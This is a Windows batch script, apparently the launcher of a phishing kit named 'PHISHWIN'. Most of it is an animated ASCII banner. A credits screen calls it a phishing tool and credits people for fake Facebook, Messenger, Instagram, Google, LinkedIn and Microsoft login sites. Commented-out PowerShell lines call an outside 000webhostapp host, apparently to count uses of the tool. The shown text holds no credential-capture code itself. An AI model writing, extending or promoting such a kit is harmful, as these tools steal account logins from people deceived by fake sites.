echo                                                     "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                     "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                     "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                     "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                     "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                      ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                      "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                      "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                      "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                      "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                      "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                       ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                       "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                       "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                       "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                       "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                       "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                        ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                        "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                        "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                        "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                        "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                        "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                         ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                         "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                         "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                         "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                         "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                         "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                          ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                          "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                          "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                          "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                          "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                          "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                           ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                           "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                           "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                           "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                           "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                           "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                            ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                            "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                            "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                            "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                            "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                            "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                             ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                             "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                             "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                             "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                             "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                             "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                              ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                              "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                              "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                              "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                              "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                              "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
goto animephish
:ourcreators
mode con: cols=128 lines=38
cls
echo ---------------------------------------------------
echo               THE CREATORS OF PHISHWIN
echo ---------------------------------------------------
echo.
echo WE HAVE A COMMUNITY IN THIS TOOL FOR PHISHING. THE 
echo CREATORS ARE WORKING TO MAKE THIS TOOL BETTER. 
echo THE CREATORS:
echo             [1] ARNOB SARKER (Main coder)
echo             [2] SKY HIGH (Reasearch))
echo             [3] ANONAUTO (Recource)
echo             [4] THE_BAT_TITANIC (Concept)
echo             [5] STACKOVERFLOW (Help)
echo             [6] NANOMETER (Modyfier)
echo             [7] INTERPRETER (Coder)
echo             [8] ANIMSCRIPT (Animator)
echo.
echo WEBSITES BY:
echo             [1] ARNOB SARKER = FACEBOOK, MESSENGER
echo             [2] SKY HIGH = INSTAGRAM
echo             [3] ZPHISHER = GOOGLE
echo             [4] ANONAUTO = LINKEDIN
echo             [5] BLACKEYE = MICROSOFT
echo.
pause
goto top
























rem // powershell -command "Invoke-WebRequest 'https://postconnectamc.000webhostapp.com/count.php' | Out-Null | echo "1 connection sent"


rem // https://postconnectamc.000webhostapp.com/count.php

rem // powershell -command "Invoke-WebRequest 'https://postconnectamc.000webhostapp.com/deltor.php' | Out-Null
exit
:colorEcho
echo off
<nul set /p ".=%DEL%" > "%~2"
findstr /v /a:%1 /R "^$" "%~2" nul
del "%~2" > nul 2>&1i